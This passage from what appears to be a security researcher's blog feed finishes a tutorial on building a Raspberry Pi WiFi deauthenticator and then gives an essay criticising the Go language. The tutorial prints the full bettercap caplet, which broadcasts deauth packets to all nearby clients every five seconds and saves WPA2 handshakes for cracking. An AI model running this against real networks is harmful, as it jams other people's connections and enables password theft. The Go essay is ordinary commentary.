<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MODE=&quot;server&quot;</span><br><span class="line">BR_DEV=&quot;br0&quot;</span><br><span class="line">BR_IP=&quot;192.168.20.99/24&quot;</span><br><span class="line">BR_GW=&quot;192.168.20.1&quot; </span><br><span class="line">ADD_IF=&quot;lo&quot; </span><br><span class="line">REMOTE_DEV=&quot;&quot; </span><br><span class="line">DEBUG=&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>Enable all the services at boot and restart them:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> bluetooth</span><br><span class="line">systemctl <span class="built_in">enable</span> btnap</span><br><span class="line">systemctl <span class="built_in">enable</span> dnsmasq</span><br><span class="line"></span><br><span class="line">service bluetooth restart</span><br><span class="line">service dnsmasq restart</span><br><span class="line">service btnap restart</span><br></pre></td></tr></table></figure>
<p>Before being able to connect via bluetooth, we need to manually pair and trust the device we’re going to use (remember to repeat this step for every new device you want to allow to connect to the PITA board), make sure your control device (your laptop for instance) has bluetooth enabled and it’s visible, then from the pita:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bluetoothctl</span><br><span class="line">&gt; agent on</span><br><span class="line">&gt; scan on</span><br><span class="line">... <span class="built_in">wait</span> <span class="keyword">for</span> your device to show up ...</span><br><span class="line">...</span><br><span class="line">... now pair with its address</span><br><span class="line">&gt; pair aa:bb:cc:dd:ee:ff</span><br><span class="line">... and trust it permantently ...</span><br><span class="line">&gt; trust aa:bb:cc:dd:ee:ff</span><br><span class="line">... <span class="built_in">wait</span> ...</span><br><span class="line">&gt; quit</span><br></pre></td></tr></table></figure>
<p>We’re now ready to “free” the wlan0 interface and use it for more cool stuff, let’s change the file <code>/etc/network/interfaces</code> to:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet static</span><br></pre></td></tr></table></figure>
<p>From the board now, disable wpa_supplicant and reboot:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service wpa_supplicant <span class="built_in">disable</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>After reboot, you’ll be able to connect to the board via bluetooth.</p>
<p><img src="/images/2018/07/bt.png" alt="bt"></p>
<p>Your system (this depends on the system you’re using, on most GNU/Linux distributions and Android this is basically automatically detected) should now have a new DHCP based <code>Pita Network</code> entry in the network manager:</p>
<p><img src="/images/2018/07/net1.png" alt="pita network"></p>
<p>Once connected, you should see a new <code>bnep0</code> network interface:</p>
<p><img src="/images/2018/07/net2.png" alt="ifconfig"></p>
<p>You can finally ssh to your PITA board via bluetooth now :)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"192.168.20.99 pita"</span> &gt;&gt; /etc/hosts</span><br><span class="line">ssh root@pita</span><br></pre></td></tr></table></figure>
<h3 id="0x03-Having-fun-with-wlan0-and-bettercap"><a href="#0x03-Having-fun-with-wlan0-and-bettercap" class="headerlink" title="[0x03] Having fun with wlan0 and bettercap"></a>[0x03] Having fun with wlan0 and bettercap</h3><p><strong>IMPORTANT</strong></p>
<p><strong>In order to install bettercap and download the caplet, you will need internet connectivity on the rpi, but we just freed wlan0 for injection, so you’ll either have to plug some ethernet adapter, smartphone in tethering mode, etc on the mini usb port now, or perform these steps while the board is still connected to your WiFi during section 0x01.</strong></p>
<p>Now that we can power our board either from a powerbank or the smartphone itself and we can connect to it via SSH over bluetooth, the next step is to install bettercap itself, we will compile it directly on the PITA, it’ll take a while but it’s very easy:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apt install golang libpcap-dev libnetfilter-queue-dev wget build-essential</span><br><span class="line"><span class="comment"># you should make this persistent in your .bashrc or .zshrc file</span></span><br><span class="line"><span class="built_in">export</span> GOPATH=/root/gocode</span><br><span class="line">mkdir -p <span class="variable">$GOPATH</span></span><br><span class="line">go get github.com/bettercap/bettercap</span><br><span class="line"><span class="comment"># wait</span></span><br><span class="line"><span class="comment"># let's install it for everyone to enjoy ^_^</span></span><br><span class="line"><span class="built_in">cd</span> /root/gocode/src/github.com/bettercap/bettercap</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="comment"># let's download the pita.cap caplet</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/bettercap/caplets/</span><br><span class="line">wget <span class="string">"https://raw.githubusercontent.com/bettercap/caplets/master/pita.cap"</span></span><br></pre></td></tr></table></figure>
<p>The <a href="https://github.com/bettercap/caplets/blob/master/pita.cap" target="_blank" rel="noopener">pita.cap</a> caplet will take care of starting wlan0 in monitor mode, periodically send deauth packets and also sniffing for WPA2 handshakes as they arrive, you can launch it and keep it persistent with something like screen or tmux. It is a basic example of what you can do now, many other functionalities can be found in the <a href="https://github.com/bettercap/caplets" target="_blank" rel="noopener">caplets repo</a> and generally in the project <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="noopener">wiki</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># More info about this caplet: https://twitter.com/evilsocket/status/1021367629901115392</span><br><span class="line"></span><br><span class="line">set $ &#123;bold&#125;😈 » &#123;reset&#125;</span><br><span class="line"></span><br><span class="line"># make sure wlan0 is in monitor mode</span><br><span class="line"># ref: https://github.com/offensive-security/kali-arm-build-scripts/blob/master/rpi3-nexmon.sh</span><br><span class="line">!monstop</span><br><span class="line">!monstart</span><br><span class="line"></span><br><span class="line"># every 5 seconds:</span><br><span class="line"># - clear the screen</span><br><span class="line"># - show the list of nearby access points </span><br><span class="line"># - deauth every client from each one of them</span><br><span class="line">set ticker.period 5</span><br><span class="line">set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff</span><br><span class="line"># sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.</span><br><span class="line">set net.sniff.verbose true</span><br><span class="line">set net.sniff.filter ether proto 0x888e</span><br><span class="line">set net.sniff.output wpa.pcap</span><br><span class="line"></span><br><span class="line"># uncomment to only hop on these channels:</span><br><span class="line"># wifi.recon.channel 1,2,3</span><br><span class="line">wifi.recon on</span><br><span class="line">ticker on</span><br><span class="line">net.sniff on</span><br><span class="line"></span><br><span class="line"># we&apos;ll see lots of probes after each deauth, just skip the noise ...</span><br><span class="line">events.ignore wifi.client.probe</span><br><span class="line"># start fresh</span><br><span class="line">events.clear</span><br><span class="line">clear</span><br></pre></td></tr></table></figure>
<p>To start bettercap with this caplet:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 up</span><br><span class="line">bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/pita.cap</span><br><span class="line"><span class="comment"># enjoy ^_^</span></span><br></pre></td></tr></table></figure>
<p>Just after a few minutes my prototype was able to deauth and capture the handshake of some device:</p>
<p><img src="/images/2018/07/victim.png" alt="victim"></p>
<p>I hope I did not forget about any step, the btnep part specifically was a little bit tricky to setup, let me know in the comments if something doesn’t work for you and I’ll try to help and fix this writeup, as usual, <strong>enjoy!</strong></p>
<center><br><img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"><br></center>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was &lt;em&gt;purely for the lulz&lt;/em&gt;) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.&lt;/p&gt;
&lt;p&gt;Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given &lt;a href=&quot;https://twitter.com/evilsocket/status/1021367629901115392&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;the interest the tweet had&lt;/a&gt; I thought to share this writeup :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2018/07/deauth.png&quot; alt=&quot;deauth&quot;&gt;&lt;/p&gt;
&lt;center&gt;&lt;small&gt;&lt;i&gt;This awesome case has been designed by &lt;a href=&quot;https://twitter.com/elkentaro&quot; target=&quot;_blank&quot;&gt;@elkentaro&lt;/a&gt; and can be found on &lt;a href=&quot;https://www.thingiverse.com/thing:3018480&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;his Thingverse page&lt;/a&gt;.&lt;/i&gt;&lt;/small&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="wifi" scheme="https://www.evilsocket.net/tags/wifi/"/>
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
      <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
    
      <category term="raspberry" scheme="https://www.evilsocket.net/tags/raspberry/"/>
    
      <category term="rpi" scheme="https://www.evilsocket.net/tags/rpi/"/>
    
      <category term="rpi zero w" scheme="https://www.evilsocket.net/tags/rpi-zero-w/"/>
    
      <category term="rpi0w" scheme="https://www.evilsocket.net/tags/rpi0w/"/>
    
      <category term="kali" scheme="https://www.evilsocket.net/tags/kali/"/>
    
      <category term="deauth" scheme="https://www.evilsocket.net/tags/deauth/"/>
    
      <category term="btnap" scheme="https://www.evilsocket.net/tags/btnap/"/>
    
  </entry>
  
  <entry>
    <title>Go Is Amazing, So Here&#39;s What I Don&#39;t Like About It</title>
    <link href="https://www.evilsocket.net/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/"/>
    <id>https://www.evilsocket.net/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/</id>
    <published>2018-03-14T22:39:09.000Z</published>
    <updated>2019-10-19T08:14:27.106Z</updated>
    
    <content type="html"><![CDATA[<p>After my last post and generally the kind of indirect advertising I’m doing to the Go programming language for a few months now, I heard about and talked with a lot of people who started being interested in the language, so for once I decided to write what I don’t like about it instead, to provide a more balanced perspective of what’s my experience so far and maybe let some of those people realize that Go is not the right choice for their projects after all.</p>
<p><strong>NOTE 1</strong></p>
<p>It’s important to say that some, if not most of the things I’m about to write are purely subjective and related to my programming habits, they do not necessarily represent so called “best practices” and should not be taken like so. Moreover, I’m still a Go noob, some of the things I’m going to say might just be inaccurate / wrong, in which case feel free to correct me and teach me something new, <strong>please</strong> :D</p>
<p><strong>NOTE 2</strong></p>
<p>Before we start: I love this language and I already explained why I still consider it a better choice for several applications, but I’m not interested in an opinion war about Go vs Rust, or Go vs whatever … use what you think it’s best for what you have to do: if that’s Rust go for it, if you think it’s binary code you send to the processor by using your nipples to inject faults into some data bus, go for it, both cases, code and let code, life is too short for being a language hipster.</p>
<a id="more"></a>
<p>Let’s start from the smallest things to the more serious ones …</p>
<h3 id="Plz-Gimme-a-Ternary-Operator"><a href="#Plz-Gimme-a-Ternary-Operator" class="headerlink" title="Plz Gimme a Ternary Operator"></a>Plz Gimme a Ternary Operator</h3><p>Writing mostly apps that run in a terminal emulator, I often find myself printing the status of the parts of the system I’m working on in terms of <code>enabled</code> / <code>disabled</code> (like enabling or disabling one of bettercap’s modules and reporting that information), which means most of the times I need to translate a <code>boolean</code> variable to a more descriptive <code>string</code>, in C++ or any other language supporting <a href="https://en.wikipedia.org/wiki/%3F:" target="_blank" rel="noopener">this operator</a> it would be something like:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> someEnabledFlagHere = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Cool module is: %s\n"</span>, someEnabledFlagHere ? <span class="string">"enabled"</span> : <span class="string">"not enabled"</span>);</span><br></pre></td></tr></table></figure>
<p>Unfortunately Go does not support this, which means you end up doing ugly stuff like:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">someEnabledFlagHere := <span class="literal">false</span></span><br><span class="line">isEnabledString := <span class="string">"not enabled"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> someEnabledFlagHere == <span class="literal">true</span> &#123;</span><br><span class="line">    isEnabledString = <span class="string">"enabled"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Printf(<span class="string">"Cool module is: %s\n"</span>, isEnabledString)</span><br></pre></td></tr></table></figure>
<p>And this is basically the most elegant way you have to do it (other that actually having a <code>map[bool]string</code> just for that …) … is it less convenient? is it more? For me it’s ugly, and when your system is highly modular, repeating this stuff over and over again can considerably increase the size of your code base, basically for no valid reason but the lack of an operator. ¯\_(ツ)_/¯</p>
<p><strong>NOTE</strong> Yes, I know you can do this by creating a function or aliasing the <code>string</code> type, there’s no need to post every possible ugly workaround on the comments, thanks :)</p>
<h3 id="Auto-generated-stuff-Documentation"><a href="#Auto-generated-stuff-Documentation" class="headerlink" title="Auto generated stuff != Documentation"></a>Auto generated stuff != Documentation</h3><p>Dear Go experts, I’m really thankful for the code you share and the stuff I manage to learn everyday by reading it, but I don’t think this is of any real use:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this function adds two integers </span></span><br><span class="line"><span class="comment">// -put captain obvious meme here-</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTwoNumbers</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As I do not think that <a href="https://godoc.org/github.com/google/gopacket" target="_blank" rel="noopener">things like these</a> are valid substitutes for documentation, while it looks like this is the standard way gophers document their code (with some exceptions of course), even if it’s about frameworks with thousands of forks and users we’re talking about … not a fan of super detailed documentation myself and this is not necessarily a huge problem if you enjoy digging into the code itself anyway, but if you’re a documentation junkie, be prepared to a continuous disappointment.</p>
<h3 id="Git-repos-as-a-Package-System-is-nuts"><a href="#Git-repos-as-a-Package-System-is-nuts" class="headerlink" title="Git repos as a Package System is nuts"></a>Git repos as a Package System is nuts</h3><p>I had an interesting conversation on Twitter a few days ago, I was explaining to someone why Go imports look like github URLs:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"github.com/bettercap/bettercap"</span></span><br></pre></td></tr></table></figure>
<p>Or simply what happens when you:</p>
<pre><code># go get github.com/bettercap/bettercap
</code></pre><p>Basically, in the simplest Go installation you might possibly use (not using <code>vendor</code> folders and/or not overriding <code>$GOPATH</code>), everything (not really but let’s pretend for the sake of simplicity) lives in this arbitrary folder you decided and with which you filled the <code>$GOPATH</code> variable, let’s say in my case it’s <code>/home/evilsocket/gocode</code> (well, <a href="https://github.com/evilsocket/dotfiles/blob/master/data/go.zshrc#L2" target="_blank" rel="noopener">it actually is</a>). Whenever I either <code>go get</code> something, or I am importing it and using <code>go get</code> to <a href="https://github.com/bettercap/bettercap/blob/master/Makefile#L28" target="_blank" rel="noopener">automagically download the needed packages</a>, what basically happens on my computer is:</p>
<pre><code># mkdir -p $GOHOME/src
# git clone https://github.com/bettercap/bettercap.git $GOHOME/src/github.com/bettercap/bettercap
</code></pre><p>Yes, Go actually uses Git repositories for packages, applications and everything Go related … which is very convenient in a way, but it creates a huge problem: as long as you don’t use different tools and / or ugly workarounds (more on this in a bit), everytime you compile a software on a new system which is missing a given package, the <code>master</code> branch of the repository of that package will be cloned, meaning <strong>you’ll potentially have different code every time you compile your project on a new computer even if the code of the application you’re compiling did not change at all</strong> (but the master branch of any of the packages did). </p>
<center><br><iframe src="https://giphy.com/embed/12NUbkX6p4xOO4" width="480" height="440" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/shia-labeouf-12NUbkX6p4xOO4" target="_blank" rel="noopener">via GIPHY</a></p><br></center>

<p>Have fun when users will start reporting bugs about third party libraries and you have no idea at which commit the repos where at when they built their version of the software from source ^_^</p>
<p>Yes, yes, <strong>yes</strong>. You can use <a href="https://github.com/Masterminds/glide" target="_blank" rel="noopener">stuff like Glide</a> or any other tool that will “freeze” your dependencies to specific commits / tags and use a separate folder for them … but that is an ugly workaround for a terrible design choice, we all know it, it works, but it’s ugly.</p>
<p>Pretty much like <a href="http://labix.org/gopkg.in" target="_blank" rel="noopener">using URL redirectors</a> in order to be able to import specific versions of a package … it works, but it’s ugly and maybe somebody might also be concerned about the security implications of that … who’s in control of those redirections? Does this whole mechanism make you feel comfortable with the stuff you’re importing in your code and compiling and running on your computer, maybe as root with sudo? <strong>It should not</strong>. </p>
<h3 id="Reflection-Mmm-not-really-…"><a href="#Reflection-Mmm-not-really-…" class="headerlink" title="Reflection? Mmm not really …"></a>Reflection? Mmm not really …</h3><p>When I first heard about Go having reflection and, being used to the concept of reflection from other languages such as Python, Ruby, but also Java, C# and so on, I had so many ideas on how to use it (or, how to use what I thought to be Go’s reflection), like automagically enumerate available 802.11 layer types and build packets out of those, resulting in automatic WiFi fuzzing or something very close to that … it turns out, <code>reflection</code> is a big word when it comes to Go :D</p>
<p>Yes, given an opaque <code>obj interface{}</code> you can get its original type and you can also list the fields of a given object, but you can’t do simple stuff like enumerating the objects ( <code>struct</code>s and generally <code>type</code>s ) that a given package exports, which might seems trivial, but without it you can’t do stuff like:</p>
<ol>
<li>Build a plugin system that autoloads stuff from a given package without explicit declarations.</li>
<li>Basically everything you can do with <code>dir</code> in Python.</li>
<li>Build the definitive 802.11 fuzzer I had in mind.</li>
</ol>
<p>So yeah, reflection is kind of limited compared to other languages … I don’t know about you, but it bothers me …</p>
<h3 id="Generics-Nah"><a href="#Generics-Nah" class="headerlink" title="Generics? Nah"></a>Generics? Nah</h3><p>While most people coming from object oriented languages will complain about the lack of generics in Go, I personally don’t find that a big issue not being a super fan of OOP-at-all-costs myself. Instead, I do think Go object model (which is basically not an object model) is simple and slim, this design is inconsistent with the complexity that generics would add IMO.</p>
<pre><code>NOTE

With this I don&apos;t mean &quot;generics == OOP&quot;, but just that the majority of developers expecting generics is because they replaced C++ with Go and expect something like templates, or the Java generics ... we can surely talk about the small minority coming from functional languages with generics or whatever, but for my experience those are not statistically relevant.
</code></pre><p>On the other end, this simplistic object model, which is quite close to <a href="https://www.thejach.com/view/2010/1/oop_in_c_with_function_pointers_and_structs" target="_blank" rel="noopener">just using function pointers and structs in C</a>, makes something else less simple and immediate than the average language.</p>
<p>Let’s say you’re developing a software that has many modules (I like modularity in case that wasn’t clear already :D), all of them derive from the same base object (so you can expect a given interface and handle them transparently) which also needs to have some default functionality already implemented and shared among all derived modules (methods all the derived modules would use so they’re directly implemented in the base object for convenience).</p>
<p>Well, while on other languages you’d have abstract classes, or stuff that is partially implemented (the common and shared methods) and partially only describes an interface (pure <code>virtual</code> methods):</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseObject</span> &#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">commonMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'm available to all derived objects!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// while this needs to be implemented by every derived object</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="title">interfaceMethod</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>It happens that Go simply does not support this, something can either be an <code>interface</code> or a base <code>struct</code> (object), but it can’t be both at the same time, so we’d need to “split” this example in this way:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BaseObjectForMethods <span class="keyword">struct</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o BaseObjectForMethods)</span> <span class="title">commonMethod</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.Printf(<span class="string">"I'm available to all derived objects!\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BaseInterface <span class="keyword">interface</span> &#123;</span><br><span class="line">    interfaceMethod()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Derived <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">// I just swallowed my base object and got its methods</span></span><br><span class="line">    BaseObjectForMethods</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="comment">// and here we implement the interface method instead</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Derived)</span> <span class="title">interfaceMethod</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// whatever, i'm a depressed object model anyway ... :/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And eventually your derived object will implement the interface and extend the base structure … it might look like the same or also that this is a more elegant and decoupled approach, but it can get messy quite fast when you try to push Go polymorphism a little bit further than this ( <a href="https://github.com/bettercap/bettercap/blob/master/session/module.go" target="_blank" rel="noopener">here a more realistic example</a> ).</p>
<h3 id="Go-stuff-is-easy-to-build-CGO-is-hell"><a href="#Go-stuff-is-easy-to-build-CGO-is-hell" class="headerlink" title="Go stuff is easy to build, CGO is hell."></a>Go stuff is easy to build, CGO is hell.</h3><p>Building (and crosscompiling) Go apps is incredibly easy, no matter for what platform you’re building it for or from. Using the same Go installation you can compile the same app for Windows, or macOS, or Android or some MIPS device with GNU/Linux if you want, no toolchains needed, no exotic compilers, no OS specific flags to remember, no weird <code>configure</code> scripts that never really work as we expect them to … <strong>HOW COOL IS THAT?!</strong> (if you come from the C/C++ world and used to cross compile your stuff a lot, you know this is huge…or if you’re a security consultant who needs to quickly cross compile his agents for both that tasty Windows domain controller and the crappy MIPS IP Cam he infected yesterday).</p>
<p>Well, <strong>it happens this is simply not the case if you’re using any native library which was not originally implemented in Go</strong>, and you probably will unless you won’t just use Go for “hello world”.</p>
<p>Let’s say your Go project is using <code>libsqlite3</code>, or <code>libmysql</code>, or <code>libwhatever</code> because whoever wrote that neat ORM you’re using in your super fast Go API did not bother reimplementing the whole DB protocol in Go (of course) but just used some nice, default, standard and well tested system library wrapped in a CGO module … so far so good, all languages have some wrapping mechanism for native libraries … and also, all is good as long as you’re just compiling your project for your host system, where <code>libsqlite3.so</code>, or <code>libmysql.so</code>, or <code>libwhatever.so</code> are available via some <code>apt-get install precompiled-swag</code> thing, but what happens when you have to crosscompile, let’s say, this project for Android? <strong>What if the destination system does not have <code>libXXXXXX.so</code> as default? Of course, you’ll either need that system’s C/C++ toolchain and compile the library yourself</strong>, or just find a way to install the compiler direcly on that system and compile everything there (using your Android tablet as a build machine basically). Have fun with that.</p>
<p>Needless to say, if you want / need to support several operating systems and architectures (why you shouldn’t given one of Go biggest strength, as we said, is exactly this?) this adds a huge amount of complexity to your build pipeline, making a Go project at least as complex to cross compile (sometimes, ironically, even more) than just a C/C++ codebase.</p>
<p>For <a href="https://github.com/evilsocket/arc" target="_blank" rel="noopener">some project of mine</a> at some point I just fully replaced the <code>sqlite</code> database I was using with JSON files, that allowed me to get rid of the native dependency and have a 100% Go app, which made crosscompilation <a href="https://github.com/evilsocket/arc/releases" target="_blank" rel="noopener">super easy again</a> ( while <a href="https://github.com/bettercap/bettercap/blob/master/build.sh" target="_blank" rel="noopener">this is the hell</a> you’re going to have to manage if you just can’t avoid having native dependencies … sorry about that :/ ).</p>
<p>If your <code>super-smart-self</code> is now screaming <strong>USE STATIC BUILDS!!!!</strong> all over (statically compile libraries in order to at least have them -inside- the binary), just don’t. If you compile everything statically with a given version of <code>glibc</code> the binary will not work on systems with a different <code>glibc</code>.</p>
<p>If your <code>even-smarter-self</code> is now screaming <strong>USE DOCKER FOR BUILDS!!!!!</strong>, find a way to do it correctly for -every- platform and -every- arch and then send me an email :)</p>
<p>If your <code>but-i-kinda-know-go-for-real-self</code> is about to suggest some exotic <code>glibc</code> alternative, see requirements for his brother, Mr <code>even-smarter-self</code> :D</p>
<h3 id="ASLR-Nope-troll-face"><a href="#ASLR-Nope-troll-face" class="headerlink" title="ASLR? Nope! -troll face-"></a>ASLR? Nope! -troll face-</h3><p>So ok, this is kind of controversial, <a href="https://rain-1.github.io/golang-aslr.html" target="_blank" rel="noopener">Go binaries have no ASLR</a>, <strong>BUT</strong>, given how Go manages memory (and mostly, given <a href="https://golang.org/doc/faq#no_pointer_arithmetic" target="_blank" rel="noopener">it doesn’t have pointer arithmetic</a>) that <strong>should not</strong> be a security issue, as long as you do not use bindings to native libraries with vulnerabilities, in which case the lack of Go ASLR would <a href="http://blog.securitymouse.com/2014/07/bla-bla-lz4-bla-bla-golang-or-whatever.html" target="_blank" rel="noopener">make exploitation way easier</a>.</p>
<p>Now, I kind of get Go developers point and I kind of don’t: why adding complexity to the runtime just to protect the runtime from something it is not vulnerable to in the first place? … but considering how often you end up using native libraries (see the previous section of this post :P) just ignoring the problem is not a wise approach regardless IMHO.</p>
<h3 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h3><p>There are many other small things I don’t like about Go, but that is also true for every other language I know, so I just focused on the main things and tried to skip stuff like <code>i don&#39;t like this syntax X</code> which is completely subjective (and I do like Go syntax btw). I saw many people, blindly embracing a new language just because it’s trending on GitHub … on one hand, if so many developers decided to use it, there are indeed good reasons (or they’re just <code>compile-anything-to-javascript</code> hipsters), but the perfect language which is the best option for every possible application does not exist (yet, I still have faith in nipples and fault injection U.U), always better to double check the pros and cons.</p>
<center><br>peace<br><br><img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"><br></center>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;After my last post and generally the kind of indirect advertising I’m doing to the Go programming language for a few months now, I heard about and talked with a lot of people who started being interested in the language, so for once I decided to write what I don’t like about it instead, to provide a more balanced perspective of what’s my experience so far and maybe let some of those people realize that Go is not the right choice for their projects after all.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE 1&lt;/strong&gt;&lt;/p&gt;
